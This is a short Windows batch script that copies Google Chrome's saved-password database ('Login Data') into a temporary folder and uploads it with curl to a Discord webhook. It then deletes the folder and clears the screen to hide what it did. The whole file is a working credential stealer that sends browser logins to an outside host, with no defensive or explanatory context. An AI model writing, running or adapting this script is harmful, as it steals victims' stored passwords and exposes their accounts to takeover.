mkdir temp
cd temp
echo. 2>data.txt
cd ..
cls
COPY "%localappdata%\Google\Chrome\User Data\Default\Login Data" "temp/data.txt"
curl -i -H "Accept: multipart/form-data" -H "Content-Type: multipart/form-data" -X POST -F "file1=@temp/data.txt" https://ptb.discord.com/api/webhooks/webhooks_id/webhooks_token
rmdir /s /q "temp"
cls